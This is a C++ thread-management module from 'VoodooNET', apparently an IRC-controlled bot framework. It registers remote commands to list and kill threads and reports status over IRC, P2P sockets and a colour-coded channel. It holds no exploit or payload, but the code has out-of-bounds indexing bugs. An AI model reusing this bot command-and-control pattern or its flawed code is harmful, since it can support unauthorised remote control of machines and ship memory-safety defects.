/*
 *  VoodooNET - a modular multi-threaded program for Windows x86/x64 bit
 *	Coded by VoRTeCKZ - @therealvorteckz
 *  VoRTeCKZ Studios
 *
 *	Copyright (C) 2023 - All Rights Reserved.
 *
 * Permission to ("use, copy, and/or modify") this software for
 * any purpose  with or without fee is hereby granted, provided that the above copyright
 * notice and this permission notice appear in all copies.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED,
 * INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR
 * PURPOSE AND NONINFRINGEMENT OF THIRD PARTY RIGHTS. IN NO EVENT SHALL THE AUTHORS OR
 * COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN
 * ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE
 * SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 *
 */

#include "includes.h"

THREAD threads[MAX_THREADS];


// Thread Name Strings
char str_magic_thread[] = "cMagic";
char str_testone_thread[] = "cTestOne";
char str_astro_thread[] = "cAstro";



void cThread::Init()
{
#ifdef _DEBUG
	g_cVoodoo->m_cLogging.Print("cThread", "Initializing");
#endif
	ADDCMD(m_cmdListThread, "thread.list", "List Threads", this);
	ADDCMD(m_cmdKillThread, "thread.kill", "Kill Threads", this);
	ADDCMD(m_cmdKillAllThreads, "thread.killall", "Kills All Threads", this);


	ADDMODULE(m_cThreadModule, "cThread", "0.1", "Thread Module");

}
cThread::cThread()
{

}
bool cThread::cModuleHandler(char* name, char* desc, ...)


{

	return true;

}

bool cThread::HandleCommand(char* cmd, char* params, ...)
{
	int iCount = 0;
	list<command*>::iterator ic;
	cString m_sCmd(cmd);
	cString m_sParams(params);
	for (ic = g_cVoodoo->m_cCommands.m_lCommands.begin(); ic != g_cVoodoo->m_cCommands.m_lCommands.end(); ++ic)
	{
		iCount++;
		//	if (!_strcmpi((*ic)->sName.c_str(), cmd))
		if (!m_sCmd.Compare((*ic)->sName.c_str()))
		{
#ifdef _DEBUG
			g_cVoodoo->m_cLogging.PrintLine("cCommands:RegisteredCommand", "Registered Command: [Command: %s] [Description: %s] [Params: %s]", (*ic)->sName.c_str(), (*ic)->sDescription.c_str(), m_sParams.CStr());
#endif
#ifndef NO_IRC
			g_cVoodoo->m_cIRC.sendmsg("[cCommands]: Registered Command: [Command %d]: %s] [Description: %s]", iCount, (*ic)->sName.c_str(), (*ic)->sDescription.c_str());
#endif
#ifndef NO_ASTRO
			g_cVoodoo->m_cAstro.sendmsg("04[15cCommands04]: 04[15CommandNum:00 %d04]:00 %s04] [15Description: 00%s04]", iCount, (*ic)->sName.c_str(), (*ic)->sDescription.c_str());
#endif

		}

	}


	if (!m_sCmd.CompareNoCase("thread.list"))
	{
		DWORD id;
		int i = 0;

		NTHREAD threadlist = *((NTHREAD*)params);
		NTHREAD* threadlistp = (NTHREAD*)params;
		//NTHREAD tlist;
		char str_list_thread[] = "List Thread";
		Sleep(50);
#ifdef _DEBUG
		g_cVoodoo->m_cLogging.Print("cThread", "[Listing Threads]");
#endif
#ifndef NO_IRC
		g_cVoodoo->m_cIRC.sendmsg("[cThread]: [Listing Threads]");
#endif
#ifndef NO_ASTRO
		g_cVoodoo->m_cAstro.sendmsg("04[15cThread04]: [15Listing Threads04]");
#endif
#ifndef NO_P2P
		g_cVoodoo->m_cServer.SendToClients("[cThread]: [Listing Threads]");
#endif
		threadlist.threadnum = g_cVoodoo->m_cThread.AddThread(LIST_THREAD, str_list_thread, "ListThread");
		if (threads[threadlist.threadnum].tHandle = CreateThread(NULL, 0, &ListThread, (LPVOID)&threadlist, 0, &id)) {
			//g_cVoodoo->m_cLogging.Print("cThread:DEBUG1", "[Name: %s]", threads[threadlist.threadnum].tHandle);

		}

		//g_cVoodoo->m_cAstro.sendmsg(threadlist.target, "%s End of list.", "test");
		g_cVoodoo->m_cThread.ClearThread(threadlist.threadnum);


	}
	else if (!m_sCmd.Token(0, " ").Compare("thread.kill"))
	{
		try {
			g_cVoodoo->m_cThread.KillThread(atoi(m_sParams.CStr()));
			g_cVoodoo->m_cThread.ClearThread(atoi(m_sParams.CStr()));
		}
		catch (...) {

			g_cVoodoo->m_cLogging.Print("Thread.Kill", "Error killing thread!");
			return false;
		}
		return true;
	}
	else if (!m_sCmd.CompareNoCase("thread.killall"))
	{
		g_cVoodoo->m_cThread.KillAllThreads();
	}

	return false;
}
bool cThread::Mutex(const char* threadname)
{
	int i = 0;
	for (i = 0; i < MAX_THREADS; i++)
	{
		if (!_strcmpi(threadname, threads[i].name)) {
#ifndef NO_ASTRO
			g_cVoodoo->m_cAstro.sendmsg("04[15cThread:Mutex04] [00%s04.00c04] [00Duplicate Thread Found, Cancelling04]00", threadname);
#endif
			return true;
		}
	}
	return false;
}
int cThread::AddThread(int id, char* name, ...)
{


	char tbuffer[(IRCLINE - (MAX_NICKLEN + 10))];
	va_list argp;
	va_start(argp, name);
	_vsnprintf_s(tbuffer, sizeof(tbuffer), name, argp);
	int i = 0;
	for (i = 1; i < MAX_THREADS; i++) {
		if (threads[i].name[0] == '\0') {
			strncpy_s(threads[i].name, tbuffer, sizeof(threads[i].name) - 1);
			threads[i].id = id;
			threads[i].parent = 0;
			threads[i].pid = 0;
			break;
		}
	}
	return i;
}
DWORD WINAPI ListThread(LPVOID param)
{
	NTHREAD threadlist = *((NTHREAD*)param);
	NTHREAD* threadlistp = (NTHREAD*)param;

#ifdef _DEBUG
	g_cVoodoo->m_cLogging.Print("cThread", "Listing");
#endif
	try
	{
		for (int i = 0; i < MAX_THREADS; i++)
		{
			if (threads[i].name[0] != '\0' && (threads[i].parent == 0) && (threads[i].tHandle != 0))
			{

#ifdef _DEBUG
				g_cVoodoo->m_cLogging.PrintLine("cThread", "[%d. %s]", i, threads[i].name);
#endif
#ifndef NO_IRC
				g_cVoodoo->m_cIRC.sendmsg("[cThread]: [%d.] %s", i, threads[i].name);
#endif
#ifndef NO_ASTRO
				g_cVoodoo->m_cAstro.sendmsg("04[15cThread04]: [15%d00.04]00 %s", i, threads[i].name);

#endif
#ifndef NO_P2P
				for (int y = 1; y <= MAX_CLIENTS; y++)
				{
					if (clients[y].socket != NULL)
						g_cVoodoo->m_cServer.RawSend(clients[y].socket, "[%d. %s]\r\n", i, threads[i].name);
				}
#endif
			}

		}
	}
	catch (...)
	{
		ExitThread(0);
	}
#ifdef _DEBUG
	g_cVoodoo->m_cLogging.Print("cThread", "End of /List");
#endif
#ifndef NO_IRC
	g_cVoodoo->m_cIRC.sendmsg("[cThread]: [End of /List]");
#endif
#ifndef NO_ASTRO
	g_cVoodoo->m_cAstro.sendmsg("04[15cThread04]: [15End of 00/15List04]");
#endif
	//g_cVoodoo->m_cThread.ClearThread(threadlist.threadnum);

	Sleep(50);
	ExitThread(0);
}

BOOL cThread::KillThread(int threadnum)
{
	BOOL threadkilled = FALSE;
	if (threadnum >= -1)
	{

		TerminateThread(threads[threadnum].tHandle, 1);
		if (threads[threadnum].tHandle != 0)
		{
			threadkilled = TRUE;
#ifdef _DEBUG
			g_cVoodoo->m_cLogging.Print("cThread", "[Killed Thread (THREADNUMBER %i: THREADNAME: %s)]", threadnum, threads[threadnum].name);
#endif
#ifndef NO_IRC
			g_cVoodoo->m_cIRC.sendmsg("[cThread]: [Killed Thread (THREADNUMBER %i: THREADNAME: %s)]", threadnum, threads[threadnum].name);
#endif
#ifndef NO_ASTRO
			g_cVoodoo->m_cAstro.sendmsg("04[15cThread04]: [15Killed Thread 15(00THREADNUMBER 04%i: 00THREADNAME: 04%s15)04]", threadnum, threads[threadnum].name);
#endif
			//g_cVoodoo->m_cServer.Cleanup();
		}
		g_cVoodoo->m_cThread.ClearThread(threadnum);
	}

	return threadkilled;
}

BOOL cThread::KillThreadP2P()
{
	BOOL threadkilled = FALSE;
	for (int z = 0; z <= MAX_THREADS; z++)
	{
		if (!_strcmpi(threads[z].name, "cServerDaemon"))
		{
			TerminateThread(threads[z].tHandle, 1);
			if ((threads[z].tHandle != 0))
			{
				threadkilled = TRUE;
#ifdef _DEBUG
				g_cVoodoo->m_cLogging.PrintLine("cThread", "[Killed Server P2P Thread (THREADNUMBER %i: THREADNAME: %s)]", z, threads[z].name);
#endif
#ifndef NO_IRC
				g_cVoodoo->m_cIRC.sendmsg("[cThread]: [Killed Thread P2P (THREADNUMBER %i: THREADNAME: %s)]", z, threads[z].name);
#endif
#ifndef NO_ASTRO
				g_cVoodoo->m_cAstro.sendmsg("04[15cThread04]: [15Killed Thread P2P 15(00THREADNUMBER 04%i: 00THREADNAME:04 %s15)04]", z, threads[z].name);
#endif
#ifndef NO_P2P
				g_cVoodoo->m_cServer.Cleanup();
#endif
				g_cVoodoo->m_cThread.ClearThread(z);
				return true;

			}
			return false;

		}
	}

	return threadkilled;
}
int cThread::checkifperm(int threadnum)
{
	if (threads[threadnum].PFLAG != TRUE)
		return 0;

	return 1;

}
int cThread::KillAllThreads(void)
{
	int i = 0;

#ifdef _DEBUG
	g_cVoodoo->m_cLogging.Print("cThreads", "[Killing All Runing Threads");
#endif
#ifndef NO_IRC
	g_cVoodoo->m_cIRC.sendmsg("[cThreads]: [Killing All Running Threads]");
#endif
#ifndef NO_ASTRO
	g_cVoodoo->m_cAstro.sendmsg("04[15cThreads04]: [15Killing All Running Threads04]");
#endif
	for (i = 0; i < MAX_THREADS; i++)
	{
		if (g_cVoodoo->m_cThread.checkifperm(i) != 1)
		{
			g_cVoodoo->m_cThread.KillThread(i);
			g_cVoodoo->m_cThread.ClearThread(i);
		}
	}
	return 0;
}

void cThread::ClearAllThreads()
{
	//cIRC irc;
	for (int i = 0; i < MAX_THREADS; i++)
	{
		g_cVoodoo->m_cThread.KillThread(i);
		g_cVoodoo->m_cThread.ClearThread(i);
	}
#ifdef _DEBUG
	g_cVoodoo->m_cLogging.Print("cThread:Main", "Cleared all threads");
#endif

}
void cThread::ClearThread(int threadnum)
{
		threads[threadnum].tHandle = 0;
		threads[threadnum].id = 0;
		threads[threadnum].parent = 0;
		threads[threadnum].pid = 0;
		threads[threadnum].name[0] = '\0';
}